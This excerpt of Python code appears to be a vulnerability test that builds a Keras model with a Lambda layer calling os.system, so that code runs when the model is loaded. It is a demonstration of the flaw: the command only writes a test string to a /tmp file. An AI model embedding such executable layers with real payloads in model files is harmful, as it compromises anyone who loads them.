...
mnist_dataset_folder = os.path.join(downloads_folder, "corrupted_dataset")
yaml_filename = os.path.join(downloads_folder, "corrupted_definition.yaml")
model_filename = os.path.join(downloads_folder, "corrupted_model.keras")
zip_filename = os.path.join(downloads_folder, "corrupted_dataset.zip")
...
def create_corrupted_model(output_path):
    """Create and save a corrupted TensorFlow model."""
    def malicious_function(x):
        import os
        """Simulate arbitrary code execution."""
        os.system(
            "echo 'This is a test of arbitrary code execution' > /tmp/test_vulnerability.txt")
        return x

    model = tf.keras.Sequential([
        tf.keras.layers.Input(shape=(64,)),
        tf.keras.layers.Lambda(malicious_function)  # Vulnerable layer
    ])
    model.compile()
    model.save(output_path)
    print(f"Corrupted model saved to {output_path}")
...
# Create and save the corrupted model (in Downloads)
create_corrupted_model(model_filename)
